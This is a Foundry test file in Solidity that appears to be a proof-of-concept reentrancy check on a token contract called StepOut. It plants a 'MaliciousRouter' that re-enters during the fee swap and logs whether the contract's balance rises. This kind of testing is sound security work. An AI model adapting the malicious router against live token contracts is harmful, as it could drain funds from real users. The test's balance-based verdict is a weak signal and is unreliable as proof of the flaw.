// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/StepOut.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1234);
    }
}

contract MaliciousRouter is IRouter {
    bool public isReentering;
    StepOut public token;

    function setToken(StepOut _token) external {
        token = _token;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 /* amountIn */,
        uint256 /* amountOutMin */,
        address[] calldata /* path */,
        address /* to */,
        uint256 /* deadline */
    ) external override {
        if (!isReentering) {
            isReentering = true;
            
            // Reenter by transferring tokens to contract
            if (token.balanceOf(address(this)) > 0) {
                token.transfer(address(token), token.balanceOf(address(this)));
            }
            
            isReentering = false;
        }
    }

    // Router interface stubs
    function factory() external pure override returns (address) { 
        return address(0xabcd);
    }

    function WETH() external pure override returns (address) { 
        return address(0xdead);
    }

    function addLiquidityETH(
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external payable override returns (uint256, uint256, uint256) {
        return (0,0,0);
    }
}

contract WETHMock {
    function deposit() external payable {}
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract StepOutReentrancyTest is Test {
    StepOut public token;
    MaliciousRouter public maliciousRouter;
    MockFactory public mockFactory;
    
    address owner = address(0xBEEF);
    address marketingWallet = address(0xCAFE);
    address user = address(0x1);
    address constant HARDCODED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address weth = address(new WETHMock());
    
    uint256 public initialSupply;
    
    function setUp() public {
        // Deploy mock contracts
        mockFactory = new MockFactory();
        maliciousRouter = new MaliciousRouter();
        
        // Mock hardcoded router calls
        vm.mockCall(
            HARDCODED_ROUTER,
            abi.encodeWithSelector(IRouter.factory.selector),
            abi.encode(address(mockFactory))
        );
        vm.mockCall(
            HARDCODED_ROUTER,
            abi.encodeWithSelector(IRouter.WETH.selector),
            abi.encode(weth)
        );
        vm.mockCall(
            HARDCODED_ROUTER,
            abi.encodeWithSelector(IRouter.addLiquidityETH.selector),
            new bytes(0)
        );
        
        // Mock factory createPair
        vm.mockCall(
            address(mockFactory),
            abi.encodeWithSelector(MockFactory.createPair.selector),
            abi.encode(address(0x1234))
        );
        
        // Deploy token contract
        vm.prank(owner);
        token = new StepOut();
        
        // Configure token
        maliciousRouter.setToken(token);
        vm.startPrank(owner);
        token.updateMarketingWallet(marketingWallet);
        token.updateRouterAndPair(IRouter(address(maliciousRouter)), address(0x1234));
        
        // Set fees and enable swapping
        token.setSellTaxes(10, 5, 0); // 10% marketing, 5% liquidity
        token.setSwapEnabled(true);
        token.setSwapThreshold(1 ether);
        vm.stopPrank();
        
        // Fund user
        initialSupply = token.totalSupply();
        vm.prank(owner);
        token.transfer(user, initialSupply / 2);
    }

    function testReentrancyInSwapForFees() public {
        // --- BEFORE-Trigger token.balanceOf(address(token)) ---
        uint256 beforeBalance = token.balanceOf(address(token));
        console.log("Before trigger - token contract balance:", beforeBalance);
        
        // --- Trigger Reentrant Transfer ---
        console.log("--- Triggering reentrant transfer ---");
        uint256 amount = 10**token.decimals() * 1000;
        vm.startPrank(user);
        token.approve(address(this), amount);
        token.transfer(address(this), amount);
        vm.stopPrank();
        
        // --- AFTER-Trigger token.balanceOf(address(token)) ---
        uint256 afterBalance = token.balanceOf(address(token));
        console.log("After trigger - token contract balance:", afterBalance);

        // --- Differential comparison ---
        bool vulnerabilityExists = afterBalance > beforeBalance;
        console.log("Balance change:", afterBalance - beforeBalance);
        console.log("Vulnerability state:", vulnerabilityExists ? "EXISTS" : "NOT FOUND");
        
        // Final conditional verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: reentrancy increased contract balance by %s tokens", afterBalance - beforeBalance);
        } else {
            console.log("Vulnerability not Exist: no balance increase detected");
        }
    }
}